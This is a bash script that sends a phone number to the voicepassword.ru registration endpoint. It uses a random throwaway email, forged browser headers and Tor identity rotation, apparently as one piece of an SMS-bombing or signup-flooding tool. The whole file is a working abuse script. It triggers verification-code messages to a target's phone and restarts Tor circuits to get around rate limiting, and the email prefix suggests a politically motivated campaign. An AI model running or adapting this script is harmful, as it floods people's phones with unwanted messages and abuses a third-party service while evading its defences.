#!/bin/bash

PHONE="$(echo "$1" | sed -E 's/^\+([0-9]{1,2})([0-9]{3})([0-9]{3})([0-9]{2})([0-9]{2})$/\1(\2)\3-\4-\5/')"

echo "+$PHONE"

EMAIL="stop_war_vs_ukraine$RANDOM%40mail.ru"
RESULT=$(curl -ks 'https://vp.voicepassword.ru/regEvent.php' \
-H 'Connection: keep-alive' \
-H 'sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="99", "Google Chrome";v="99"' \
-H 'Accept: */*' \
-H 'DNT: 1' \
-H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' \
-H 'sec-ch-ua-mobile: ?0' \
-H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36' \
-H 'sec-ch-ua-platform: "Windows"' \
-H 'Origin: https://voicepassword.ru' \
-H 'Sec-Fetch-Site: same-site' \
-H 'Sec-Fetch-Mode: cors' \
-H 'Sec-Fetch-Dest: empty' \
-H 'Referer: https://voicepassword.ru/' \
-H 'Accept-Language: ru-UA,ru;q=0.9' \
--data-raw "event=register&utm_source=&number=%2B$PHONE&email=$EMAIL" \
--compressed)

if [ "$(echo "$RESULT" | grep -c '"success":"send_code"')" = "0" ]; then
  echo "$RESULT"
  echo "false"
  pkill -sighup tor 2>/dev/null
else
  echo "true"
fi
